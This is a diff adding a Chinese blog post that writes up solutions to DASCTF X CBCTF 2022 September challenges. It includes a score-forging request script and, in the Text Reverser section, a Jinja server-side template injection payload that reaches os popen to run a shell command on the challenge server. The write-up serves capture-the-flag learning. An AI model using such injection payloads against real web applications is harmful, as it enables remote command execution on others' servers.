@@ -1,0 +1,323 @@
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>  DASCTF_9月 |    o10d3blb</title>
+  <meta name="description" content="永远相信美好的事情即将发生">
+  <!-- 标签页图标 -->
+  
+
+  <!-- 图标库 -->
+  <link href="https://cdn.jsdelivr.net/npm/remixicon@2.2.0/fonts/remixicon.css" rel="stylesheet">
+  <!-- 动画库 -->
+  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fushaolei/cdn-white@1.0/css/animate.css"/>
+  
+  <!-- css文件 -->
+  
+<link rel="stylesheet" href="/css/white.css">
+
+  <!-- 代码高亮 -->
+  
+    
+      
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.1.1/styles/github.css">
+
+    
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+
+<div class="menu-outer">
+    <div class="menu-inner">
+      <div class="menu-site-name  animate__animated  animate__fadeInUp">
+        <a href="/">
+          o10d3blb
+        </a>
+        
+      </div>
+      <div class="menu-group">
+        <ul class="menu-ul">
+        
+          <a href="/" class="nav-link">
+            <li class="menu-li  animate__animated  animate__fadeInUp">
+              Home
+            </li>
+          </a>
+        
+          <a href="/archives" class="nav-link">
+            <li class="menu-li  animate__animated  animate__fadeInUp">
+              Blog
+            </li>
+          </a>
+        
+        
+          <li class="menu-li animate__animated  animate__fadeInUp" id="sort">
+             Category
+             <div class="categories-outer " id="sort-div">
+               <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90/">计算机组成</a></li></ul>
+             </div>
+          </li>
+        
+        
+          <li class="menu-li animate__animated  animate__fadeInUp" id="mobile-menu">
+            <i class="ri-menu-line"></i>
+          </li>
+        
+        </ul>
+
+      </div>
+
+    </div>
+</div>
+<div id="mobile-main" class="animate__animated  animate__fadeIn">
+  <div class="mobile-menu-inner">
+    <div class="mobile-menu-site-name animate__animated  animate__fadeInUp">
+      <a href="/">
+        o10d3blb
+      </a>
+    </div>
+    <div class="mobile-menu-group" id="mobile-close">
+      <i class="ri-close-line"></i>
+    </div>
+
+  </div>
+
+  <div class="mobile-menu-div">
+  
+    <a href="/" class="mobile-nav-link">
+      <div class="mobile-menu-child animate__animated  animate__fadeInUp">
+        <span>Home</span>
+      </div>
+    </a>
+  
+    <a href="/archives" class="mobile-nav-link">
+      <div class="mobile-menu-child animate__animated  animate__fadeInUp">
+        <span>Blog</span>
+      </div>
+    </a>
+  
+  
+  </div>
+
+
+</div>
+
+<div class="body-outer">
+  <div class="body-inner">
+    
+<article class="post-inner">
+  <div class="post-content-outer">
+    <div class="post-intro">
+      <div class="post-title animate__animated  animate__fadeInUp">DASCTF_9月</div>
+      <div class="meta-intro animate__animated  animate__fadeInUp">Oct 11 2022</div>
+      
+    </div>
+    <div class="post-content-inner">
+      <div class="post-content-inner-space">
+
+      </div>
+      <div class="post-content-main animate__animated  animate__fadeInUp">
+        <!-- top型目录 -->
+        
+        <h1 id="DASCTF-X-CBCTF-2022九月挑战赛"><a href="#DASCTF-X-CBCTF-2022九月挑战赛" class="headerlink" title="DASCTF X CBCTF 2022九月挑战赛"></a>DASCTF X CBCTF 2022九月挑战赛</h1><p>期中考结束了有点时间，做点题熟一下手，欢迎讨论</p>
+<h2 id="dino3D"><a href="#dino3D" class="headerlink" title="dino3D"></a>dino3D</h2><p>审计源码<br>找到了发送请求的部分<br>
+        <span class="lazyload-img-span">
+        <img   
+           data-src="https://img2022.cnblogs.com/blog/2687686/202211/2687686-20221108130915449-872963823.png" >
+        </sapn>
+      <br>
+        <span class="lazyload-img-span">
+        <img   
+           data-src="https://img2022.cnblogs.com/blog/2687686/202211/2687686-20221108131024946-883167811.png" >
+        </sapn>
+      <br>
+        <span class="lazyload-img-span">
+        <img   
+           data-src="https://img2022.cnblogs.com/blog/2687686/202211/2687686-20221108131033449-1923461288.png" >
+        </sapn>
+      </p>
+<pre><code class="python">import requests
+from hashlib import md5
+import time
+target = &quot;http://node4.buuoj.cn:29625/check.php&quot;
+
+headers = &#123;
+    &quot;Content-type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;
+&#125;
+
+
+body = &#123;
+    &quot;score&quot;: &quot;10000000&quot;,
+    &quot;checkCode&quot;: md5(&quot;10000000DASxCBCTF_wElc03e&quot;.encode()).hexdigest(),
+    &quot;tm&quot;: str((time.time()))[:10]
+&#125;
+
+
+res = requests.post(target, headers=headers, data=body)
+print(res.text)
+</code></pre>
+<p>得到flag<br>
+        <span class="lazyload-img-span">
+        <img   
+           data-src="https://img2022.cnblogs.com/blog/2687686/202211/2687686-20221108131250546-1184911317.png" >
+        </sapn>
+      </p>
+<h2 id="Text-Reverser"><a href="#Text-Reverser" class="headerlink" title="Text Reverser"></a>Text Reverser</h2><p><code>&#123;&#123;&#125;&#125;```和反转后的```&#125;&#125;&#123;&#123;</code>都被ban了,<br>但似乎没有对反转后的字符串进行检测，那么可以随便进行ssti注入啦<br>找一下能利用的类</p>
+<pre><code class="python">import requests
+from bs4 import BeautifulSoup
+import re
+
+evalC = [&quot;warnings.catch_warnings&quot;, &quot;WarningMessage&quot;, &quot;codecs.IncrementalEncoder&quot;,
+         &quot;codecs.IncrementalDecoder&quot;, &quot;codecs.StreamReaderWriter&quot;, &quot;os._wrap_close&quot;, &quot;reprlib.Repr&quot;, &quot;weakref.finalize&quot;]
+popenC = [&quot;os._AddedDllDirectory&quot;, &quot;os._wrap_close&quot;]
+
+target = &quot;http://ad4abcf2-c3cc-4f81-a64c-2c75f15429d8.node4.buuoj.cn:81/&quot;
+
+rce = &#39;&#123;% print "".__class__.__bases__[0].__subclasses__()%&#125;&#39;
+rce = rce[::-1]
+body = &#123;
+    &quot;text&quot;: rce,
+&#125;
+
+res = requests.post(target, data=body)
+q = BeautifulSoup(res.content, &quot;lxml&quot;)
+classes = str(q.p)
+
+classes = re.sub(&quot;&#39;&quot;, &quot;&quot;, re.sub(&quot; class &quot;, &quot;&quot;, re.sub(
+    &quot;&amp;...&quot;, &quot;&quot;, re.sub(&quot;&lt;p&gt;.........&quot;, &quot;&quot;, re.sub(&quot;]&lt;/p&gt;&quot;, &quot;&quot;, classes)))))
+classlist = classes.split(&quot;,&quot;)
+index = 0
+
+print(classlist)
+
+for i in classlist:
+    if i in popenC:
+        print(index, i)
+    index += 1
+</code></pre>
+<p>发现有能执行<code>popen()</code>方法的<code>os._wrap_close</code><br>反转下面的payload就拿到flag了<br><code>&#123;% print "".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('nl /flag').read()%&#125;</code><br>
+        <span class="lazyload-img-span">
+        <img   
+           data-src="https://img2022.cnblogs.com/blog/2687686/202211/2687686-20221108182355086-205119504.png" >
+        </sapn>
+      </p>
+<h2 id="zzz-again"><a href="#zzz-again" class="headerlink" title="zzz_again"></a>zzz_again</h2><p>看了一晚上头已经要炸了，好变态的代码审计</p>
+
+        <!-- 分类文章 -->
+        
+          <div class="post-categoris-bottom">
+            <div class="post-categoris-name">网络安全</div>
+            <ul>
+            
+            
+              
+            
+            
+            
+              
+                <li class="base">
+                  <a  href="/2022/09/07/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Dest0g3_520/" class="post-categoris-bottom-link">
+                  Dest0g3 520迎新赛
+                </a>
+                </li>
+              
+              
+            
+            
+            
+              
+                <li class="me base">
+                  <a  href="/2022/10/11/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DASCTF_9%E6%9C%88/" class="post-categoris-bottom-link">
+                  DASCTF_9月
+                </a>
+                </li>
+              
+              
+            
+            
+            
+              
+            
+            
+            </ul>
+
+          </div>
+
+        
+      </div>
+      <div class="post-content-inner-space">
+        
+          <div class="space-toc-main animate__animated  animate__fadeInUp">
+            <ol class="space-toc"><li class="space-toc-item space-toc-level-2"><a class="space-toc-link" href="#dino3D"><span class="space-toc-text">dino3D</span></a></li><li class="space-toc-item space-toc-level-2"><a class="space-toc-link" href="#Text-Reverser"><span class="space-toc-text">Text Reverser</span></a></li><li class="space-toc-item space-toc-level-2"><a class="space-toc-link" href="#zzz-again"><span class="space-toc-text">zzz_again</span></a></li></ol>
+           </div>
+        
+      </div>
+   </div>
+    <!-- 评论 -->
+    
+  </div>
+</article>
+  </div>
+</div>
+
+
+
+<!-- 如果是home模式的话，不在首页就显示footer，如果不是home模式的话 所有都显示footer -->
+
+  <div class="footer-outer animate__animated  animate__fadeInUp">
+    <div class="footer-inner">
+    <div class="footer-text">
+    <p>Always believe that something wonderful is about to happen</p>
+
+    </div>
+    <div class="footer-contact">
+    <ul class="footer-ul">
+        
+        <li class="footer-li">
+            <a href="https://github.com/ccuuy" target="_blank">
+                <i class="ri-github-line"></i>
+            </a>
+        </li>
+        
+        <li class="footer-li">
+            <a href="qdmengg@foxmail.com" target="_blank">
+                <i class="ri-mail-line"></i>
+            </a>
+        </li>
+        
+        <li class="footer-li">
+            <a href="https://www.zhihu.com/people/da-shuai-bi-34-99" target="_blank">
+                <i class="ri-zhihu-line"></i>
+            </a>
+        </li>
+        
+    </ul>
+    </div>
+    </div>
+</div>
+
+
+
+
+
+
+<script src="/js/white.js"></script>
+
+
+
+    
+      
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.18.1/build/highlight.min.js"></script>
+
+      <script>hljs.initHighlightingOnLoad();</script>
+    
+
+</body>
+</html>
